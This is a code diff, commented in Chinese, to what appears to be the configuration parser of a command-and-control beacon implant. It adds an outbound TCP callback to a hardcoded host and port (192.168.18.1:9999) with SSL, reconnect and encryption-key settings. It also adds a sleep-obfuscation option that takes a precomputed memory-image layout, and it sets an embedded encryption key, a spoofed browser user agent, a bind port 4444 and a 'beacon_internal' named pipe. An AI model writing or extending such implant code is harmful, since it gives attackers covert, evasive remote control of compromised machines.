@@ -21,6 +21,7 @@
 #define CFG_JITTER 6u
 #define CFG_SLEEP_OBF_ENABLED 7u
 #define CFG_SLEEP_OBF_TECHNIQUE 8u
+#define CFG_SLEEP_IMAGE_LAYOUT 300u
 #define CFG_HTTP_HOST 100u
 #define CFG_HTTP_PORT 101u
 #define CFG_HTTP_URI 102u
@@ -41,6 +42,12 @@
 #define CFG_TCP_BIND_HOST 200u
 #define CFG_TCP_BIND_PORT 201u
 #define CFG_TCP_CONNECT_TIMEOUT 202u
+#define CFG_TCP_CALLBACK_HOST 220u
+#define CFG_TCP_CALLBACK_PORT 221u
+#define CFG_TCP_RECONNECT_COUNT 222u
+#define CFG_TCP_RECONNECT_TIME 223u
+#define CFG_TCP_SSL 224u
+#define CFG_TCP_ENCRYPT_KEY 225u
 #define CFG_SMB_PIPE_NAME 210u
 #define CFG_SMB_CONNECT_TIMEOUT 211u
 
@@ -194,6 +201,33 @@ static VOID NormalizeUri(CHAR* uri, SIZE_T uri_len)
     uri[len + 1] = 0;
 }
 
+/* 从固定 16 字节 TLV 中读取预计算映像布局 */
+static VOID ApplySleepImageLayout(Profile* p, const BYTE8* value, UINT32 value_len)
+{
+    UINT32 image_size;
+    UINT32 text_rva;
+    UINT32 text_size;
+    UINT32 text_protect;
+
+    if (!p || !value || value_len != 16u) return;
+
+    image_size = ReadBe32(value);
+    text_rva = ReadBe32(value + 4);
+    text_size = ReadBe32(value + 8);
+    text_protect = ReadBe32(value + 12);
+
+    if (image_size == 0 || text_size == 0 || text_rva >= image_size ||
+        text_size > image_size - text_rva) {
+        return;
+    }
+
+    p->sleep_layout.valid = TRUE;
+    p->sleep_layout.image_size = image_size;
+    p->sleep_layout.text_rva = text_rva;
+    p->sleep_layout.text_size = text_size;
+    p->sleep_layout.text_protect = text_protect ? text_protect : PAGE_EXECUTE_READ;
+}
+
 /* 解析 TLV 格式的配置数据并填充 Profile */
 static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
 {
@@ -243,6 +277,9 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
             } else if (value_len > 0) {
                 p->sleep_obf_technique = (SleepObfTechnique)value[0];
             }
+            break;
+        case CFG_SLEEP_IMAGE_LAYOUT:
+            ApplySleepImageLayout(p, value, value_len);
             break;
         case CFG_HTTP_HOST:
             CopyTlvString(target.http_host, sizeof(target.http_host), value, value_len);
@@ -301,6 +338,26 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
             break;
         case CFG_HTTP_ENCRYPT_KEY:
             CopyTlvString(p->http.encrypt_key, sizeof(p->http.encrypt_key), value, value_len);
+            CopyTlvString(p->encrypt_key, sizeof(p->encrypt_key), value, value_len);
+            break;
+        case CFG_TCP_CALLBACK_HOST:
+            CopyTlvString(p->tcp_external.callback_host, sizeof(p->tcp_external.callback_host), value, value_len);
+            break;
+        case CFG_TCP_CALLBACK_PORT:
+            if (value_len == 4) p->tcp_external.callback_port = (INT)ReadBe32(value);
+            break;
+        case CFG_TCP_RECONNECT_COUNT:
+            if (value_len == 4) p->tcp_external.reconnect_count = (INT)ReadBe32(value);
+            break;
+        case CFG_TCP_RECONNECT_TIME:
+            if (value_len == 4) p->tcp_external.reconnect_time_ms = (INT)ReadBe32(value);
+            break;
+        case CFG_TCP_SSL:
+            if (value_len > 0) p->tcp_external.ssl = value[0] != 0;
+            break;
+        case CFG_TCP_ENCRYPT_KEY:
+            CopyTlvString(p->tcp_external.encrypt_key, sizeof(p->tcp_external.encrypt_key), value, value_len);
+            CopyTlvString(p->encrypt_key, sizeof(p->encrypt_key), value, value_len);
             break;
         case CFG_HTTP_HOST_HEADER:
             CopyTlvString(p->http.host_header, sizeof(p->http.host_header), value, value_len);
@@ -417,12 +474,20 @@ VOID ProfileLoad(Profile* p)
     strcpy_s(p->http.hb_prefix, sizeof(p->http.hb_prefix), "SESSIONID=");
     strcpy_s(p->http.user_agent, sizeof(p->http.user_agent), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
     strcpy_s(p->http.content_type, sizeof(p->http.content_type), "application/octet-stream");
-    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "194f7b83023fdd7c6fdfd70a4e6b9cfe");
+    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "4d137aadf252d2f89dd46173ab54ef8f");
+    strcpy_s(p->encrypt_key, sizeof(p->encrypt_key), p->http.encrypt_key);
 
     /* SSL 和重连策略 */
     p->http.ssl = 0;
     p->http.reconnect_count = 3;
     p->http.reconnect_time_ms = 3000;
+
+    strcpy_s(p->tcp_external.callback_host, sizeof(p->tcp_external.callback_host), "192.168.18.1");
+    p->tcp_external.callback_port = 9999;
+    p->tcp_external.reconnect_count = 3;
+    p->tcp_external.reconnect_time_ms = 3000;
+    p->tcp_external.ssl = 1;
+    strcpy_s(p->tcp_external.encrypt_key, sizeof(p->tcp_external.encrypt_key), p->encrypt_key);
 
     strcpy_s(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), "0.0.0.0");
     p->tcp_internal.bind_port = 4444;
@@ -431,7 +496,12 @@ VOID ProfileLoad(Profile* p)
     strcpy_s(p->smb_internal.pipe_name, sizeof(p->smb_internal.pipe_name), "\\\\.\\pipe\\beacon_internal");
     p->smb_internal.connect_timeout_ms = 10000;
 
-#if defined(BEACON_INTERNAL_TCP_BUILD)
+#if defined(BEACON_EXTERNAL_TCP_BUILD)
+    strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-tcp-external");
+    strcpy_s(p->listener_type, sizeof(p->listener_type), "external");
+    strcpy_s(p->protocol, sizeof(p->protocol), "tcp");
+    strcpy_s(p->format, sizeof(p->format), "tcp");
+#elif defined(BEACON_INTERNAL_TCP_BUILD)
     strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-tcp-internal");
     strcpy_s(p->listener_type, sizeof(p->listener_type), "internal");
     strcpy_s(p->protocol, sizeof(p->protocol), "tcp");
